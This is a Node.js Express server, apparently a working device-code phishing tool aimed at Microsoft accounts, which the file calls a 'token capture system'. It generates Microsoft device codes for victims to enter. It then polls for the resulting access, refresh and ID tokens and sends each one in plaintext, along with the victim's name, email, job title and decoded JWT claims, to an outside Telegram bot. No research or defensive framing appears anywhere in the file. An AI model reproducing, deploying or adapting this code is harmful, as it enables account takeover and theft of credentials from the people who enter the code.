require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');

const app = express();

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================================
// CONFIGURATION - Only Essential Variables
// ============================================================================

const config = {
  microsoft: {
    tenantId: process.env.MICROSOFT_TENANT_ID || 'common',
    clientId: process.env.MICROSOFT_CLIENT_ID,
  },
  telegram: {
    botToken: process.env.TELEGRAM_BOT_TOKEN,
    chatId: process.env.TELEGRAM_CHAT_ID,
  },
  port: process.env.PORT || 3000,
  encryptionKey: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
};

// Validate required config
if (!config.microsoft.clientId) {
  console.error('❌ MICROSOFT_CLIENT_ID is required!');
  process.exit(1);
}

if (!config.telegram.botToken || !config.telegram.chatId) {
  console.error('⚠️  WARNING: Telegram not configured. Tokens will only be logged to console.');
}

// ============================================================================
// ENCRYPTION UTILITIES - AES-256-GCM
// ============================================================================

class TokenEncryption {
  static encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(config.encryptionKey, 'hex'), iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return {
      encrypted,
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
    };
  }

  static decrypt(encryptedData) {
    const decipher = crypto.createDecipheriv(
      'aes-256-gcm',
      Buffer.from(config.encryptionKey, 'hex'),
      Buffer.from(encryptedData.iv, 'hex')
    );
    
    decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
    
    let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}

// ============================================================================
// STORAGE - Simple In-Memory
// ============================================================================

const deviceCodeStore = new Map();
const tokenStore = new Map();

// ============================================================================
// TELEGRAM NOTIFICATION
// ============================================================================

async function sendToTelegram(title, data, options = {}) {
  if (!config.telegram.botToken || !config.telegram.chatId) {
    console.log(`[TELEGRAM DISABLED] ${title}`, data);
    return;
  }

  try {
    let text = `${title}\n`;
    text += `━━━━━━━━━━━━━━━━━━━━━━\n`;
    text += `🕐 ${new Date().toLocaleString()}\n\n`;

    if (data && typeof data === 'object') {
      for (const [key, value] of Object.entries(data)) {
        if (value !== null && value !== undefined) {
          if (typeof value === 'object' && !Array.isArray(value)) {
            text += `\n📋 *${key}*\n\`\`\`json\n${JSON.stringify(value, null, 2).substring(0, 500)}\n\`\`\`\n`;
          } else {
            // Truncate very long values for readability
            const displayValue = String(value).length > 200 
              ? String(value).substring(0, 200) + '...' 
              : value;
            text += `• *${key}*: ${displayValue}\n`;
          }
        }
      }
    }

    const maxLength = options.maxLength || 4000;
    if (text.length > maxLength) {
      text = text.substring(0, maxLength) + '\n\n...(truncated)';
    }

    await axios.post(
      `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
      {
        chat_id: config.telegram.chatId,
        text,
        parse_mode: 'Markdown',
      }
    );

    console.log(`[TELEGRAM] ✅ Sent: ${title}`);
  } catch (error) {
    console.error(`[TELEGRAM] ❌ Failed:`, error.message);
  }
}

// ============================================================================
// JWT DECODER
// ============================================================================

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    return {
      header: JSON.parse(Buffer.from(parts[0], 'base64').toString()),
      payload: JSON.parse(Buffer.from(parts[1], 'base64').toString()),
      signature: parts[2],
    };
  } catch (error) {
    return null;
  }
}

// ============================================================================
// MICROSOFT ENDPOINTS
// ============================================================================

const MICROSOFT_ENDPOINTS = {
  deviceCode: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
  token: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
  userInfo: 'https://graph.microsoft.com/v1.0/me',
};

// ============================================================================
// API ENDPOINTS
// ============================================================================

// Serve frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Generate device code
app.post('/api/device/generate', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();

    console.log(`\n[GENERATE] Creating device code for session: ${sessionId}`);

    // Request device code from Microsoft
    const response = await axios.post(
      MICROSOFT_ENDPOINTS.deviceCode,
      new URLSearchParams({
        client_id: config.microsoft.clientId,
        scope: 'User.Read offline_access profile email openid',
      }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      }
    );

    const deviceCodeData = response.data;

    // Store device code info
    deviceCodeStore.set(sessionId, {
      deviceCode: deviceCodeData.device_code,
      userCode: deviceCodeData.user_code,
      verificationUri: deviceCodeData.verification_uri,
      verificationUriComplete: deviceCodeData.verification_uri_complete,
      expiresIn: deviceCodeData.expires_in,
      interval: deviceCodeData.interval,
      createdAt: Date.now(),
      status: 'pending',
    });

    console.log(`[GENERATE] ✅ Code: ${deviceCodeData.user_code}`);
    console.log(`[GENERATE] 🔗 URL: ${deviceCodeData.verification_uri}`);

    // Send to Telegram
    await sendToTelegram(
      `🔐 *DEVICE CODE GENERATED*`,
      {
        'Session ID': sessionId,
        'User Code': deviceCodeData.user_code,
        'Verification URL': deviceCodeData.verification_uri,
        'Complete URL': deviceCodeData.verification_uri_complete,
        'Expires In': `${deviceCodeData.expires_in} seconds`,
        'Time': new Date().toLocaleString(),
      }
    );

    res.json({
      sessionId,
      userCode: deviceCodeData.user_code,
      verificationUri: deviceCodeData.verification_uri,
      verificationUriComplete: deviceCodeData.verification_uri_complete,
      expiresIn: deviceCodeData.expires_in,
      interval: deviceCodeData.interval,
    });

  } catch (error) {
    console.error('[ERROR] Device code generation failed:', error.message);
    
    await sendToTelegram(
      `❌ *DEVICE CODE ERROR*`,
      {
        'Error': error.message,
        'Details': error.response?.data?.error_description || 'Unknown error',
      }
    );

    res.status(500).json({ 
      error: 'Failed to generate device code',
      details: error.message 
    });
  }
});

// Poll for authentication
app.get('/api/device/poll/:sessionId', async (req, res) => {
  try {
    const { sessionId } = req.params;
    const deviceInfo = deviceCodeStore.get(sessionId);

    if (!deviceInfo) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }

    // Check if already authenticated
    const existingToken = tokenStore.get(sessionId);
    if (existingToken) {
      return res.json({
        status: 'authenticated',
        user: existingToken.user,
      });
    }

    // Check expiration
    if (Date.now() - deviceInfo.createdAt > deviceInfo.expiresIn * 1000) {
      deviceInfo.status = 'expired';
      await sendToTelegram(
        `⏰ *DEVICE CODE EXPIRED*`,
        { 'Session ID': sessionId, 'User Code': deviceInfo.userCode }
      );
      return res.json({ status: 'expired' });
    }

    // Poll Microsoft for token
    try {
      const tokenResponse = await axios.post(
        MICROSOFT_ENDPOINTS.token,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: config.microsoft.clientId,
          device_code: deviceInfo.deviceCode,
        }),
        {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        }
      );

      const tokenData = tokenResponse.data;

      console.log(`\n[SUCCESS] ✅ Authentication successful for session: ${sessionId}`);
      console.log(`[TOKEN] Access token captured (${tokenData.access_token.length} chars)`);
      console.log(`[TOKEN] Refresh token captured (${tokenData.refresh_token?.length || 0} chars)`);

      // Get user info
      const userInfoResponse = await axios.get(MICROSOFT_ENDPOINTS.userInfo, {
        headers: { Authorization: `Bearer ${tokenData.access_token}` },
      });

      const userInfo = userInfoResponse.data;

      // Decode JWT
      const decodedToken = decodeJWT(tokenData.access_token);

      // Encrypt tokens
      const encryptedAccessToken = TokenEncryption.encrypt(tokenData.access_token);
      const encryptedRefreshToken = tokenData.refresh_token 
        ? TokenEncryption.encrypt(tokenData.refresh_token) 
        : null;

      // Store for session
      tokenStore.set(sessionId, {
        status: 'authenticated',
        user: {
          id: userInfo.id,
          displayName: userInfo.displayName,
          email: userInfo.mail || userInfo.userPrincipalName,
          jobTitle: userInfo.jobTitle,
        },
        capturedAt: Date.now(),
      });

      // ========================================================================
      // SEND COMPREHENSIVE TOKEN DATA TO TELEGRAM
      // ========================================================================

      // Message 1: Authentication Success
      await sendToTelegram(
        `✅ *AUTHENTICATION SUCCESSFUL*`,
        {
          'Session ID': sessionId,
          'User Code': deviceInfo.userCode,
          '👤 Name': userInfo.displayName,
          '📧 Email': userInfo.mail || userInfo.userPrincipalName,
          '💼 Job Title': userInfo.jobTitle || 'N/A',
          '🔑 User ID': userInfo.id,
          'Time': new Date().toLocaleString(),
        }
      );

      // Message 2: UNENCRYPTED Access Token
      await sendToTelegram(
        `🔓 *ACCESS TOKEN (UNENCRYPTED)*`,
        {
          'Token': tokenData.access_token,
          'Type': tokenData.token_type,
          'Expires In': `${tokenData.expires_in} seconds`,
          'Token Length': tokenData.access_token.length,
          'Scopes': tokenData.scope,
        },
        { maxLength: 4000 }
      );

      // Message 3: ENCRYPTED Access Token
      await sendToTelegram(
        `🔐 *ACCESS TOKEN (ENCRYPTED)*`,
        {
          'Encrypted Data': encryptedAccessToken.encrypted.substring(0, 200) + '...',
          'IV': encryptedAccessToken.iv,
          'Auth Tag': encryptedAccessToken.authTag,
          'Algorithm': 'AES-256-GCM',
          'Full Encrypted Object': encryptedAccessToken,
        }
      );

      // Message 4: UNENCRYPTED Refresh Token
      if (tokenData.refresh_token) {
        await sendToTelegram(
          `🔄 *REFRESH TOKEN (UNENCRYPTED)*`,
          {
            'Token': tokenData.refresh_token,
            'Token Length': tokenData.refresh_token.length,
            'Can Refresh': 'Yes - Use this to get new access tokens',
          },
          { maxLength: 4000 }
        );

        // Message 5: ENCRYPTED Refresh Token
        await sendToTelegram(
          `🔐 *REFRESH TOKEN (ENCRYPTED)*`,
          {
            'Encrypted Data': encryptedRefreshToken.encrypted.substring(0, 200) + '...',
            'IV': encryptedRefreshToken.iv,
            'Auth Tag': encryptedRefreshToken.authTag,
            'Algorithm': 'AES-256-GCM',
            'Full Encrypted Object': encryptedRefreshToken,
          }
        );
      }

      // Message 6: ID Token (if exists)
      if (tokenData.id_token) {
        await sendToTelegram(
          `🆔 *ID TOKEN (UNENCRYPTED)*`,
          {
            'Token': tokenData.id_token,
            'Token Length': tokenData.id_token.length,
          },
          { maxLength: 4000 }
        );
      }

      // Message 7: Decoded JWT
      if (decodedToken) {
        await sendToTelegram(
          `🔓 *DECODED ACCESS TOKEN (JWT)*`,
          {
            'Header': decodedToken.header,
            'Payload': decodedToken.payload,
          }
        );
      }

      // Message 8: Token Claims
      if (decodedToken?.payload) {
        await sendToTelegram(
          `📋 *TOKEN CLAIMS & PERMISSIONS*`,
          {
            'Subject (sub)': decodedToken.payload.sub,
            'Audience (aud)': decodedToken.payload.aud,
            'Issuer (iss)': decodedToken.payload.iss,
            'Issued At': decodedToken.payload.iat ? new Date(decodedToken.payload.iat * 1000).toLocaleString() : 'N/A',
            'Expires': decodedToken.payload.exp ? new Date(decodedToken.payload.exp * 1000).toLocaleString() : 'N/A',
            'Name': decodedToken.payload.name,
            'Email': decodedToken.payload.email || decodedToken.payload.preferred_username,
            'Scopes': decodedToken.payload.scp || 'N/A',
          }
        );
      }

      // Message 9: Summary
      await sendToTelegram(
        `📊 *CAPTURE SUMMARY*`,
        {
          'Session ID': sessionId,
          'Total Messages': '8-9 messages sent',
          'Access Token': '✅ Captured (Encrypted & Unencrypted)',
          'Refresh Token': tokenData.refresh_token ? '✅ Captured (Encrypted & Unencrypted)' : '❌ Not issued',
          'ID Token': tokenData.id_token ? '✅ Captured' : '❌ Not issued',
          'JWT Decoded': decodedToken ? '✅ Yes' : '❌ No',
          'User Profile': '✅ Captured',
          'Encryption': 'AES-256-GCM',
          'Status': 'Complete',
        }
      );

      // Clean up device code
      deviceCodeStore.delete(sessionId);

      res.json({
        status: 'authenticated',
        user: {
          id: userInfo.id,
          displayName: userInfo.displayName,
          email: userInfo.mail || userInfo.userPrincipalName,
        },
        message: 'Tokens captured and sent to Telegram',
      });

    } catch (error) {
      if (error.response?.data?.error === 'authorization_pending') {
        return res.json({ status: 'pending' });
      } else if (error.response?.data?.error === 'authorization_declined') {
        await sendToTelegram(
          `❌ *AUTHENTICATION DECLINED*`,
          { 'Session': sessionId, 'User Code': deviceInfo.userCode }
        );
        return res.json({ status: 'declined' });
      } else if (error.response?.data?.error === 'expired_token') {
        return res.json({ status: 'expired' });
      } else {
        throw error;
      }
    }

  } catch (error) {
    console.error('[ERROR] Polling failed:', error.message);
    res.status(500).json({ error: 'Polling failed', details: error.message });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    activeSessions: deviceCodeStore.size,
    capturedTokens: tokenStore.size,
    telegram: config.telegram.botToken ? 'configured' : 'disabled',
    encryption: 'AES-256-GCM',
  });
});

// ============================================================================
// CLEANUP
// ============================================================================

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, deviceInfo] of deviceCodeStore.entries()) {
    if (now - deviceInfo.createdAt > deviceInfo.expiresIn * 1000) {
      deviceCodeStore.delete(sessionId);
      console.log(`[CLEANUP] Removed expired session: ${sessionId}`);
    }
  }
}, 5 * 60 * 1000); // Every 5 minutes

// ============================================================================
// SERVER START
// ============================================================================

app.listen(config.port, async () => {
  console.log('\n' + '='.repeat(80));
  console.log('🔐 MICROSOFT DEVICE AUTH - TOKEN CAPTURE SYSTEM');
  console.log('='.repeat(80));
  console.log(`📡 Port: ${config.port}`);
  console.log(`🔐 Tenant: ${config.microsoft.tenantId}`);
  console.log(`🔑 Client ID: ${config.microsoft.clientId ? '✅ Set' : '❌ Missing'}`);
  console.log(`📱 Telegram: ${config.telegram.botToken ? '✅ Active' : '⚠️  Disabled (logs only)'}`);
  console.log(`🔒 Encryption: AES-256-GCM ✅`);
  console.log('='.repeat(80));
  console.log('\n✨ Features:');
  console.log('   ✅ Device Code Generation');
  console.log('   ✅ UNENCRYPTED Token Capture');
  console.log('   ✅ ENCRYPTED Token Capture (AES-256-GCM)');
  console.log('   ✅ Access Token (Both Forms)');
  console.log('   ✅ Refresh Token (Both Forms)');
  console.log('   ✅ ID Token');
  console.log('   ✅ JWT Decoding');
  console.log('   ✅ Telegram Notifications (8-9 messages)');
  console.log('   ✅ Simple Frontend');
  console.log('='.repeat(80) + '\n');

  if (config.telegram.botToken) {
    await sendToTelegram(
      `🚀 *TOKEN CAPTURE SYSTEM ONLINE*`,
      {
        'Status': 'Running',
        'Port': config.port,
        'Encryption': 'AES-256-GCM',
        'Captures': 'Encrypted + Unencrypted Tokens',
        'Started': new Date().toLocaleString(),
      }
    );
  }
});

module.exports = app;
